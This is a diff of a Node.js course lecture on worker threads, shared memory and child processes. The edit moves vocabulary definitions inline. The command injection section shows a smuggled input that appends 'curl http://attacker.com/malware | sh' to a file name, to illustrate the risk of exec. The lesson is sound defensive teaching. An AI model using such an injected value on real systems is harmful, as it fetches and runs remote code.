@@ -6,19 +6,6 @@
 
 </nav>
 
-## Learning Outcomes
-
-By the end of this lecture, you should be able to:
-
-- Distinguish CPU-bound computation from I/O-bound operations and explain why promises, `async/await`, and the libuv thread pool do not execute arbitrary JavaScript in parallel.
-- Architect high-throughput CPU offloading using `node:worker_threads` with isolated V8 Isolates, structured cloning, and zero-copy `ArrayBuffer` transfer lists.
-- Synchronize concurrent thread memory safely using `SharedArrayBuffer` and `Atomics` primitives while avoiding race conditions, memory tearing, and deadlocks.
-- Compare and select among `worker_threads`, `child_process` (`spawn`, `fork`, `exec`, `execFile`), and external worker queues based on memory overhead, IPC throughput, crash containment, and operational blast radius.
-- Guard against critical command injection vulnerabilities by strictly eliminating shell interpolation (`shell: false`) and enforcing immutable argument vectors.
-- Implement an enterprise-grade, bounded Worker Thread Pool featuring task queuing, cooperative cancellation, worker lifecycle recovery, and admission control backpressure.
-
----
-
 ## Prerequisites
 
 Before diving into concurrency and process isolation, review:
@@ -26,20 +13,6 @@ Before diving into concurrency and process isolation, review:
 - [Day 02: Event Loop and Scheduling](day-02-event-loop-and-scheduling.md) for libuv phases and single-threaded execution constraints.
 - [Day 04: Process, Configuration, and Lifecycle](day-04-process-configuration-and-lifecycle.md) for OS process signals, stdio streams, and exit codes.
 - [Day 06: Buffers, Encodings, and Serialization](day-06-buffers-encodings-and-serialization.md) for raw byte allocation and `ArrayBuffer` internals.
-
----
-
-## Quick Vocabulary Card
-
-| Term | Programming Definition | Anti-Pattern / Misconception |
-| :--- | :--- | :--- |
-| **V8 Isolate** | An independent instance of the V8 JavaScript engine with its own heap, call stack, and garbage collector. | Believing worker threads share JavaScript object references or global variables with the main thread. |
-| **Structured Clone Algorithm** | The recursive serialization algorithm used by `postMessage` to duplicate complex JavaScript object graphs between threads or processes. | Assuming `postMessage` passes references; modifying an object on the receiving thread modifies it on the sender. |
-| **Transferable Object** | An object (such as an `ArrayBuffer` or `MessagePort`) whose binary memory ownership is transferred between threads with zero copying ($O(1)$), detaching it on the sender. | Attempting to read or write an `ArrayBuffer` on the sender thread after transferring it (throws `TypeError: Cannot perform operation on detached ArrayBuffer`). |
-| **`SharedArrayBuffer`** | A binary memory buffer that shares the exact same physical byte allocation across multiple V8 Isolates simultaneously. | Reading and writing `SharedArrayBuffer` bytes directly with standard TypedArrays without `Atomics`, causing data tearing and race conditions. |
-| **Command Injection** | A vulnerability where untrusted user input is passed directly to an operating system shell interpreter (`sh`, `bash`, `cmd.exe`), allowing arbitrary command execution. | Spawning processes via `exec("convert " + userFile)` instead of `execFile` or `spawn` with an explicit argument array and `shell: false`. |
-| **Crash Containment** | Isolating catastrophic faults (native segfaults, OOM aborts, uncaught fatal exceptions) to a child process boundary without bringing down the main API server. | Using worker threads for unstable C++ native addons; a segfault in a worker thread immediately terminates the entire parent Node.js process. |
-
 ---
 
 ## Core Concepts
@@ -94,6 +67,8 @@ Node.js offers four distinct mechanisms for multi-threaded and multi-process exe
 ### 3. Worker Threads Architecture (`node:worker_threads`)
 
 A Worker Thread runs an independent V8 Isolate and its own libuv event loop inside the parent operating system process:
+
+> **V8 Isolate**: An independent instance of the V8 JavaScript engine with its own heap, call stack, and garbage collector.
 
 ```text
 OS Process (PID: 12345)
@@ -238,6 +213,8 @@ if (isMainThread) {
 ---
 
 ### 2. Thread-Safe Mutex Lock using `SharedArrayBuffer` and `Atomics`
+
+> **`SharedArrayBuffer`**: A binary memory buffer that shares the exact same physical byte allocation across multiple V8 Isolates simultaneously.
 
 Building a spin-wait and sleep mutex lock to coordinate access to shared memory without race conditions.
 
@@ -687,11 +664,15 @@ parentPort.on('message', (taskData) => {
 
 When passing data via `worker.postMessage(obj)`, Node.js by default applies the HTML **Structured Clone Algorithm**. This algorithm recursively traverses the entire object graph, serializing every key, value, and nested array into an intermediate binary representation, and then deserializes and re-allocates a completely new duplicate object graph inside the target thread's V8 heap. For large payloads (such as a 100MB buffer or a complex tree with 50,000 nodes), this cloning process consumes significant CPU time, runs synchronously on both threads, and temporarily doubles total memory consumption.
 
+> **Structured Clone Algorithm**: The recursive serialization algorithm used by `postMessage` to duplicate complex JavaScript object graphs between threads or processes.
+
 In contrast, **Transferring** an `ArrayBuffer` utilizes the transfer list syntax (`worker.postMessage({ buf }, [buf])`). Instead of copying bytes, Node.js detaches the underlying raw memory pointer from the sender's V8 Isolate and attaches it directly to the receiver's V8 Isolate. The operation takes $O(1)$ constant time regardless of buffer size (0.01ms even for gigabyte buffers) with zero memory duplication. The crucial tradeoff is that the buffer becomes completely detached and inaccessible on the sender thread; any subsequent attempt to read or write to it on the sender throws a `TypeError`.
 
 ### 3. What are the key architectural tradeoffs between choosing `worker_threads` versus `child_process.fork()` for isolating a heavy background task?
 
 The choice between `worker_threads` and `child_process.fork()` comes down to **memory overhead and IPC performance** versus **crash containment and process isolation**:
+
+> **Crash Containment**: Isolating catastrophic faults (native segfaults, OOM aborts, uncaught fatal exceptions) to a child process boundary without bringing down the main API server.
 
 1. **Memory & Performance**: Worker threads run in the same OS process and share the same virtual address space. Creating a worker requires only ~30–50MB of RAM, and communication can leverage zero-copy `ArrayBuffer` transfers or `SharedArrayBuffer`. In contrast, `child_process.fork()` spawns an entire operating system process with a separate process table entry, file descriptor table, and ~60–100MB of RAM. IPC between child processes must serialize data across OS pipes, incurring higher serialization and context-switching overhead.
 2. **Crash Containment & Blast Radius**: Worker threads share the same native process space. If a worker thread triggers a low-level native segmentation fault (e.g. inside a native C++ addon or binding), or triggers an out-of-memory abort, the **entire parent Node.js process crashes**, terminating the main server. Conversely, a child process is protected by operating system memory management boundaries; if a child process segfaults or runs out of memory, only the child process dies. The parent receives an `'exit'` signal and continues operating normally.
@@ -699,6 +680,8 @@ The choice between `worker_threads` and `child_process.fork()` comes down to **m
 Rule of thumb: Use `worker_threads` for pure JavaScript CPU-heavy calculations and high-frequency data pipelines; use `child_process.fork()` for unstable third-party native addons, sandbox isolation, or workloads requiring hard memory limits.
 
 ### 4. How does the `exec` function introduce Command Injection vulnerabilities, and how does using `spawn` or `execFile` with argument arrays mitigate the risk?
+
+> **Command Injection**: A vulnerability where untrusted user input is passed directly to an operating system shell interpreter (`sh`, `bash`, `cmd.exe`), allowing arbitrary command execution.
 
 The `child_process.exec(command)` function passes the command string directly to a system shell interpreter (`/bin/sh` on Unix or `cmd.exe` on Windows). The shell parses the string, interpreting metacharacters such as semicolons (`;`), pipes (`|`), ampersands (`&`), and backticks (`` ` ``) as command separators. If any portion of the command string contains unsanitized user input (for example, `exec('cat ' + userInput)`), an attacker can inject malicious shell commands (such as `userInput = "file.txt; curl http://attacker.com/malware | sh"`). The shell executes both commands sequentially with the full permissions of the Node.js process.
 
